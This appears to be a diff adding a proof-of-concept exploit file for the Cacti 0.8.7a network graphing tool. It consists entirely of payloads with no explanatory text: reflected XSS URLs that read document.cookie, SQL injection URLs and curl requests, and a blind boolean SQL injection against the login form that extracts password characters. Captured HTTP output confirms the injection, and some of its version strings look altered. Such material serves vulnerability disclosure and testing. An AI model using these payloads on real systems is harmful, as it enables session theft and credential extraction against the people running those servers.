@@ -1,0 +1,58 @@
+http://www.example.com/cacti/graph.php?local_graph_id=1&rra_id=34&action=properties&view_type=token'%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/cacti/graph_view.php?action=list&page=1&host_id=0&graph_template_id=8&filter=onmouseover=javascript:alert(/XSS/)
+http://www.example.com/cacti/index.php?action=foo/%3Cscript%3Ealert('XSS')%3C/script%3E
+http://www.example.com/cacti/graph_view.php?action=preview&style=selective&graph_list=bla'%20or%20'1'='1
+http://www.example.com/cacti/tree.php?action=edit&id=1&subaction=foo&leaf_id=1%20or%201%20=%201
+
+
+
+curl "http://www.example.com/cacti/graph_xport.php?local_graph_id=1" -d \
+"local_graph_id=1'" -H "Cookie: Cacti=<cookie value>"
+
+curl "http://www.example.com/cacti/tree.php?action=edit&id=1" -d \
+"id=sql'" -H "Cookie: Cacti=<cookie value>"
+
+curl -v "http://www.example.com/cacti/index.php/sql.php" -d \
+"login_username=foo'+or+ascii(substring(password,1,1))>56#&action=login"
+
+$ curl -v "http://www.example.com/cacti/index.php/sql.php" -d \
+"login_username=foo'+or+ascii(substring(password,1,1))<56#&action=login"
+* About to connect() to www.example.com port 80 (#0)
+*   Trying 127.0.0.1... connected
+* Connected to www.example.com (127.0.0.1) port 80 (#0)
+> POST /cacti-0.8.7a/index.php/sql.php HTTP/1.1
+> User-Agent: curl/1.1.1 (i986-gnu-ms-bsd) cacalib/3.6.9 OpenTelnet/0.1
+> Host: www.example.com
+> Accept: */*
+> Content-Length: 71
+> Content-Type: application/x-www-form-urlencoded
+>
+< HTTP/1.1 200 OK
+< Date: Mon, 17 Dec 2007 19:29:34 GMT
+< Server: Apache
+< X-Powered-By: PHP/1.2.3-linuxz
+< Content-Length: 355
+< Content-Type: text/html
+
+AAAAAAAAA: SELECT * FROM user_auth WHERE username = 'foo' or
+ascii(substring(password,1,1))<56#' AND password = md5('') AND realm=0
+<br />
+<b>Warning</b>:  Cannot modify header information - headers already
+sent by (output started at /home/x/cacti-0.8.7a/auth_login.php:126)
+in <b>/home/x/cacti-0.8.7a/auth_login.php</b> on line <b>200</b><br />
+* Connection #0 to host www.example.com left intact
+* Closing connection #0
+
+$ curl -kis "http://www.example.com/cacti-0.8.7a/index.php/sql.php" -d \
+"login_username=foo'+or+ascii(substring(password,1,1))>56#&action=login" \
+| head -n1
+HTTP/1.1 200 OK
+$ curl -kis "http://www.example.com/cacti-0.8.7a/index.php/sql.php" -d \
+"login_username=foo'+or+ascii(substring(password,1,1))<56#&action=login" \
+| head -n1
+HTTP/1.1 302 Found
+
+<
+
+
+
